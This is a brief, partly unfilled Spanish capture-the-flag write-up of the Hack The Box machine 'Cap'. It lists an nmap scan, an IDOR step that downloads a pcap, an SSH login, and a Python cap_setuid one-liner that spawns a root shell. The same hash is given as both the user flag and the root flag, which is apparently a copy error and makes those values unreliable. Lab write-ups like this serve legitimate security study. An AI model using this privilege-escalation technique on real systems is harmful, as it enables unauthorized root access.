---
title: Hack the box - Cap
date: 2026-09-03
platform: Hack the box
difficulty: Easy
os: Linux
tags:
  - IDOR
  - LinuxCapabilities
  - Python
status: Completada
---

# Resumen Ejecutivo
**IP Objetivo:** `10.129.234.54`
**Descripción breve:**  

---

## 1. Information Gathering (Reconocimiento)

### Escaneo de Puertos
```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv 10.129.234.54 -n -Pn -oG escaneo
```

**Puertos Abiertos:**
- 21,22, 80

### Enumeración de Servicios / Fuzzing
```bash

```

**Descubrimientos clave:**
- 

---

## 2. Vulnerability Assessment (Análisis de Vulnerabilidades)
-  [[IDOR]]
-  No hubo cifrado de datos ya que se paso por el protocolo TCP

---

## 3. Exploitation (Acceso Inicial)

### Metodología
1.  Cambiar el Id de la url de la pagina de usuario
2. descargar el archivo pcap
3.  revisar el archivo.pcap para ver el trafico

### Ejecución
```bash
ssh nathan@10.129.234.54
```

**Prueba de acceso (User Flag):**
```bash
004c6a1749bf2ced25e054a52f73807a
```

---

## 4. Privilege Escalation (Escalada de Privilegios)

### Enumeración Interna
- [[Escaladas de privilegios#Linux Capabilities|Linux Capabilities Python]]
- usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip

### Explotación Local
1. usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip

### Ejecución
```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**Prueba de acceso (Root/SYSTEM Flag):**
```bash
004c6a1749bf2ced25e054a52f73807a
```